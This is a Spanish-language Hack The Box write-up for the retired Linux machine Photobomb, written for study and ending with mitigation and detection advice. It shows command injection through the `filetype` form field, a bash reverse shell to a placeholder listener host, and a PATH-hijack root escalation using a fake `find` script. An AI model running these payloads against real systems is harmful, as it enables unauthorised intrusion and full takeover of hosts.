---
machine: Photobomb
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, command-injection, path-hijack, sinatra]
---

# Photobomb — Hack The Box (Linux)

[🌍 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La aplicación Sinatra en `photobomb.htb` protege `/printer` con Basic Auth. Las credenciales están en el JavaScript del cliente. El parámetro `filetype` se pasa a una orden de ImageMagick sin sanear, lo que permite inyección de comandos. La escalada es un PATH hijack en un script que root ejecuta con `find` sin ruta absoluta.

## Enumeración

```bash
nmap -p- --min-rate 5000 -T4 <IP>
nmap -sC -sV -p22,80 <IP>
```

Se añade `photobomb.htb` al hosts. `/` pide autenticación y `/printer` muestra el formulario de descarga. En el código fuente se carga `/photobomb.js`; ahí aparecen las credenciales en claro:

```bash
curl -s http://photobomb.htb/photobomb.js
```

## Acceso inicial

```bash
curl -u '<USER>:<PASS>' http://photobomb.htb/printer
```

El formulario envía `photo`, `filetype` y `dimensions`. Se intercepta con Burp y se prueba inyección en `filetype`:

```bash
curl -u '<USER>:<PASS>' http://photobomb.htb/printer \
  --data-urlencode 'photo=<IMAGE>' \
  --data-urlencode 'filetype=jpg;id' \
  --data-urlencode 'dimensions=600x400'
```

La respuesta incluye la salida de `id`. Se reemplaza por una reverse shell codificada en URL:

```bash
filetype=jpg;bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
```

## Escalada a root

```bash
sudo -l
# (ALL) NOPASSWD: /opt/cleanup.sh
```

El script llama a `find` sin ruta absoluta. Se crea un `find` malicioso en un directorio escribible y se altera `PATH`:

```bash
cat > /tmp/find <<'EOF'
#!/bin/sh
/bin/sh -p
EOF
chmod +x /tmp/find
sudo PATH=/tmp:$PATH /opt/cleanup.sh
```

El shell resultante es root. Se lee la flag y se redacta.

## Evidencia

- `photobomb.js` con credenciales redactadas.
- Petición a `/printer` con `filetype` y salida de `id`.
- `sudo -l` y ejecución con `PATH` modificado.

## Lecciones aprendidas

- El JavaScript del cliente no debe contener credenciales.
- Pasar parámetros a comandos del sistema sin lista blanca permite RCE.
- Un script con sudo que usa binarios sin ruta absoluta es vulnerable a PATH hijack.
- La inyección en `filetype` es trivial pero pasa desapercibida.

## Mitigación y detección

- Sacar secretos del código cliente y usar autenticación real.
- Validar `filetype` contra una lista blanca y no concatenar comandos.
- Usar rutas absolutas en scripts con privilegios.
- Detectar procesos `find`/`convert` lanzados por el servidor web y peticiones con `;`.

## Referencias

- <https://www.hackthebox.com/machines/photobomb>
- <https://owasp.org/www-community/attacks/Command_Injection>
- <https://imagemagick.org/script/security-policy.php>
